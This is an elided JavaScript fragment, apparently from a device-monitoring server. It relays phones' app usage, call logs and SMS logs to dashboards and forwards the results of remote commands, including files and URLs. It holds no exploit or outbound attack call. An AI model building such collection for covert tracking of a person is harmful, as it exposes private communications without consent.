        ...
        try {
            ...
            switch (msg.type) {
                ...
                case 'data': {
                    ...
                    const broadcastMsg = { type: 'device_update', device_id: deviceId, state };
                    if (msg.payload.app_usage) broadcastMsg.app_usage = msg.payload.app_usage;
                    if (msg.payload.call_logs) broadcastMsg.call_logs = msg.payload.call_logs;
                    if (msg.payload.sms_logs) broadcastMsg.sms_logs = msg.payload.sms_logs;
                    broadcastToDashboards(broadcastMsg);
                ...
                case 'command_ack': {
                    ...
                    broadcastToDashboards({ type: 'command_done', command_id: msg.id, device_id: deviceId, files: msg.files, url: msg.url });
